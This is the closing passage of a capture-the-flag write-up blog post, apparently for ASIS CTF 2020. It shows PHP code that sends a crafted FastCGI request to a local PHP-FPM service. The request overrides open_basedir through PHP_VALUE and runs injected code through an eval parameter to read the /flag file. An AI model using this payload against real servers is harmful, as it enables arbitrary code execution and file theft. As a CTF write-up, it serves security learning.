$client </span><span style="font-weight:bold;color:#a71d5d;">= new </span><span style="color:#0086b3;">Client</span><span style="color:#323232;">(</span><span style="color:#183691;">&#39;localhost&#39;</span><span style="color:#323232;">, </span><span style="color:#183691;">&#39;9000&#39;</span><span style="color:#323232;">);
$content </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;&lt;?php echo 123; ?&gt;&#39;</span><span style="color:#323232;">;
</span><span style="color:#62a35c;">echo </span><span style="color:#323232;">$client-&gt;request(
	</span><span style="color:#62a35c;">array</span><span style="color:#323232;">(
		</span><span style="color:#183691;">&#39;GATEWAY_INTERFACE&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;FastCGI/1.0&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;REQUEST_METHOD&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;POST&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;SCRIPT_FILENAME&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;/tmp/uploads/dicedicedice.php&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;SERVER_SOFTWARE&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;php/fcgiclient&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;REMOTE_ADDR&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;127.0.0.1&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;REMOTE_PORT&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;9985&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;SERVER_ADDR&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;127.0.0.1&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;SERVER_PORT&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;80&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;SERVER_NAME&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;mag-tured&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;QUERY_STRING&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;real_eval=echo%20file_get_contents%28%27%2Fflag%27%29%3B&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;SERVER_PROTOCOL&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;HTTP/1.1&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;CONTENT_TYPE&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;application/x-www-form-urlencoded&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;PHP_VALUE&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#183691;">&#39;open_basedir = /&#39;</span><span style="color:#323232;">,
		</span><span style="color:#183691;">&#39;CONTENT_LENGTH&#39; </span><span style="font-weight:bold;color:#a71d5d;">=&gt; </span><span style="color:#62a35c;">strlen</span><span style="color:#323232;">($content)
	),
	$content
);
</span></code></pre><p>I URI encoded the script and stuck it into the <code>real_eval</code> parameter and included our <code>dicedicedice.php</code> script. Now, we just have to send the FastCGI request as the POST body, and we will get the flag back in the response:</p><p><img alt="" src="/posts/asisctf20-abusing-php-constants-to-bypass-eval-filters/flag.png"></p></div></div><script src="https://utteranc.es/client.js" async crossorigin="anonymous" issue-term="url" label="💬comments" repo="srikavin/blog" theme="github-light"></script></div></section><script src="/bundle.js"></script></body></html>